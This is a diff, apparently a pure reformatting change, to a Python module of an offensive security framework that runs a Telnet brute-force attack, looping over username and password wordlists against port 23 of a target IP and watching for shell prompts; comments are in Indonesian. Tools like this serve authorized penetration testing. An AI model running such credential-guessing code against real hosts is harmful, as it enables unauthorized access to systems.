@@ -52,15 +52,22 @@ def execute(options, net):
     # Ambil parameter
     ip = options.get("IP")
     port = 23
-    username_file = options.get("USER")   # path file daftar username
-    password_file = options.get("PASS")   # path file daftar password
+    username_file = options.get("USER")  # path file daftar username
+    password_file = options.get("PASS")  # path file daftar password
 
     # Prompt yang umum
     promt_login = ["login:", "Login:"]
     promt_pass = ["password:", "pass:", "Password:", "Pass:"]
     promt_shell = [
-        "/ $", "$", "#", ">", "%",
-        "welcome", "last login", "password changed", "press enter",
+        "/ $",
+        "$",
+        "#",
+        ">",
+        "%",
+        "welcome",
+        "last login",
+        "password changed",
+        "press enter",
     ]
 
     smf.printf(f"{CC.CYAN}[*] Starting Telnet Bruteforce => {ip}:23{CC.RESET}\n")
@@ -91,8 +98,10 @@ def execute(options, net):
                 _, r = con.send(username, expected=promt_pass)
                 if r < 0:
                     # Username ditolak, tidak perlu lanjut ke password
-                    smf.printf(f"{CC.YELLOW}[*] Username: {username} {SYM_FAILED}{CC.RESET}")
-                    break   # keluar dari loop password, lanjut ke username berikutnya
+                    smf.printf(
+                        f"{CC.YELLOW}[*] Username: {username} {SYM_FAILED}{CC.RESET}"
+                    )
+                    break  # keluar dari loop password, lanjut ke username berikutnya
 
                 # Username diterima, kirim password
                 _, r = con.send(password, expected=promt_shell)
